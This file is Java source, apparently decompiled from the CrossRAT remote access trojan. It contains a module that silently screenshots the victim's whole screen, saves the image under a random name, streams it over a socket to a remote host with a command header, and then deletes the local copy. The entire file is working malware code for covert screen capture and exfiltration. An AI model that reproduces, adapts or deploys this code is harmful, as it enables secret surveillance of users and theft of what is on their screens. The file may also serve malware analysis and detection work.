package crossrat;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Random;

final class j extends Thread {
    private Socket a;
    private String b;
    private int c;

    public j(String var1, int var2) {
        this.b = var1;
        this.c = var2;
    }

    private void a(String var1, String var2) {
        this.a = new Socket(this.b, this.c);
        DataOutputStream var3 = new DataOutputStream(this.a.getOutputStream());
        FileInputStream var5 = new FileInputStream(var1);
        var3.writeBytes(k.g + k.d + k.I + k.d + var2 + k.d + "&&&");

        try {
            Thread.sleep(2000L);
        } catch (Exception var4) {
            var4.printStackTrace();
        }

        byte[] var6 = new byte[2048];

        while (var5.read(var6) > 0) {
            var3.write(var6);
        }

        var5.close();
        var3.close();
    }

    public final void run() {
        System.setProperty("java.awt.headless", "false");
        BufferedImage var1 = null;

        try {
            var1 = (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        } catch (HeadlessException var4) {
            var4.printStackTrace();
        } catch (AWTException var5) {
            var5.printStackTrace();
        }

        int var2 = (new Random()).nextInt(500000) + 1;
        File var7 = new File(k.K + Integer.toString(var2) + ".jpg");

        try {
            ImageIO.write(var1, "jpg", var7);
            Long var6 = var7.length();
            this.a(var7.toString(), var6.toString());
            var7.delete();
        } catch (IOException var3) {
            var3.printStackTrace();
        }
    }
}
